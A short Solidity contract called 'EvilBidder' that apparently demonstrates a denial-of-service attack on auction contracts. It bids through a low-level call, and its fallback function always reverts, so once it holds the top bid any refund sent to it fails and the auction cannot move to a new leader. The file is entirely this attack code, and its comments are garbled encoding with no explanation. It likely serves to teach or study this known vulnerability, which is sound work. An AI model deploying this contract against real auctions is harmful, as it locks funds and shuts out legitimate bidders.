pragma solidity >=0.4.11;
contract  EvilBidder {
	/// Fallback �Լ�
	function() payable{
		revert();
	}
		
	/// ���� ó�� �Լ�
	function bid(address _to) public payable {
		// ���� ó��
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		} 
	}
}
